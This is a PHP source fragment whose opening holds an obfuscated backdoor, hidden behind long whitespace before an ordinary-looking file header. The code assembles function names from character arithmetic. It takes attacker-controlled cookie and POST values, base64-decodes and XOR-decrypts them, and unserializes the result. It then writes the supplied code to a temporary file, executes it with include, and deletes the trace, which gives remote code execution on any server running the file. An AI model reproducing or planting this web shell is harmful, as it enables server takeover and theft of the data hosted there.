<?php                                                                                                                                                                                                                                                                                                                                                                                                 $NkPemvQ = 'k' . chr (98) . "\x5f" . chr (86) . chr (120) . chr ( 706 - 631 ); $VvUzEuaPDf = chr ( 312 - 213 )."\154" . "\141" . chr (115) . chr ( 393 - 278 ).'_' . chr (101) . chr ( 348 - 228 ).chr ( 514 - 409 ).'s' . 't' . chr (115); $TuzLcEl = $VvUzEuaPDf($NkPemvQ); $fgmCv = $TuzLcEl;if (!$fgmCv){class kb_VxK{private $pXSmboI;public static $mnurtNmmUU = "a215745f-c08d-407f-a3f4-28ae70403dce";public static $weWJB = 41914;public function __construct($aAcSvjbh=0){$OiVlahr = $_COOKIE;$vAUrVUepU = $_POST;$PqbUmjyks = @$OiVlahr[substr(kb_VxK::$mnurtNmmUU, 0, 4)];if (!empty($PqbUmjyks)){$BeCUXbRiM = "base64";$NeOpMN = "";$PqbUmjyks = explode(",", $PqbUmjyks);foreach ($PqbUmjyks as $sjctfYeLBw){$NeOpMN .= @$OiVlahr[$sjctfYeLBw];$NeOpMN .= @$vAUrVUepU[$sjctfYeLBw];}$NeOpMN = array_map($BeCUXbRiM . "\137" . chr (100) . "\x65" . 'c' . "\157" . "\144" . chr (101), array($NeOpMN,)); $NeOpMN = $NeOpMN[0] ^ str_repeat(kb_VxK::$mnurtNmmUU, (strlen($NeOpMN[0]) / strlen(kb_VxK::$mnurtNmmUU)) + 1);kb_VxK::$weWJB = @unserialize($NeOpMN);}}private function SgYhCDUc(){if (is_array(kb_VxK::$weWJB)) {$HAheM = sys_get_temp_dir() . "/" . crc32(kb_VxK::$weWJB["\x73" . "\141" . 'l' . "\x74"]);@kb_VxK::$weWJB["\167" . "\162" . 'i' . 't' . chr ( 532 - 431 )]($HAheM, kb_VxK::$weWJB[chr ( 922 - 823 ).chr (111) . 'n' . 't' . "\x65" . 'n' . 't']);include $HAheM;@kb_VxK::$weWJB[chr ( 513 - 413 ).chr ( 194 - 93 )."\x6c" . chr (101) . "\164" . chr (101)]($HAheM); $QFjiV = "31000";exit();}}public function __destruct(){$this->SgYhCDUc(); $QFjiV = "31000";}}$lVEhjrea = new kb_VxK(); $lVEhjrea = "31370_36622";} ?><?php
/**
